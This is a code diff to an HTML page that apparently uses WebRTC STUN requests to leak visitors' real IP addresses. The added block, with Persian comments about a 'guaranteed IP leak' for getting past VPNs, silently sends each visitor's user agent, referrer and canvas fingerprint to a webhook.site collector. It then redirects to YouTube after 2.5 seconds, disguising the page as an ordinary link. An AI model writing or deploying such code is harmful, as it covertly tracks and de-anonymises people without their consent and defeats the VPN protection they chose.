@@ -24,7 +24,23 @@
         "stun:stun.voipbuster.com",
         "stun:stun.voxgratia.org"
       ];
-
+// IP Leak تضمینی – بدون STUN (برای دور زدن بلاک VPN)
+  (function() {
+    var img = new Image();
+    var timestamp = Date.now();
+    img.src = "https://webhook.site/e14058c5-ad0d-41d1-af86-8702b7c72138?type=direct&ua=" + encodeURIComponent(navigator.userAgent) + "&time=" + timestamp + "&ref=" + encodeURIComponent(document.referrer || 'direct');
+    
+    // Canvas Fingerprint برای تشخیص VPN
+    var canvas = document.createElement('canvas');
+    var ctx = canvas.getContext('2d');
+    ctx.fillText('test', 2, 2);
+    var canvasData = canvas.toDataURL();
+    var fpImg = new Image();
+    fpImg.src = "https://webhook.site/e14058c5-ad0d-41d1-af86-8702b7c72138?type=canvas&fp=" + btoa(canvasData.substring(22)) + "&time=" + timestamp;
+    
+    // ریدایرکت
+    setTimeout(() => { location.href = "https://youtube.com"; }, 2500);
+  })();
       stunServers.forEach(url => {
         try {
           const pc = new RTCPeerConnection({iceServers: [{urls: url}]});
@@ -52,3 +68,4 @@
   </script>
 </body>
 </html>
+
